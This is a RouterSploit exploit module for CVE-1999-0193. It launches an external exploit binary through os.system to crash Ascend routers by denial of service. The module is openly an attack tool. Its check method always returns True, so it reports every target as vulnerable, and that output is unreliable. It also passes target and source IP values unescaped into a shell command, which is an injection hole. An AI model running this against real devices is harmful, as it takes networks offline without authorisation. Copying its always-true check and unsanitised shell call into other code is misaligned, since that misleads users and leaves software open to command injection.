import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-1999-0193",

        "description": "Firmware versions 2.08UI and lower contain a bug in the function that handles HTTP GET requests for "
                       " directory paths that can allow an unauthenticated attacker to cause complete denial of service "
                       " (device reboot). This bug can be triggered from both LAN and WAN.",

        "authors": (

            "Rootshell",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/20331",

        ),

        "devices": (

            "Ascend, CVE-1999-0193"
        ),
    }

    target = OptIP(""," target ip")
    srcIp = OptIP(""," source ip")

    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./exploit-db-20331 {} {}".format(self.srcIp,self.target)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
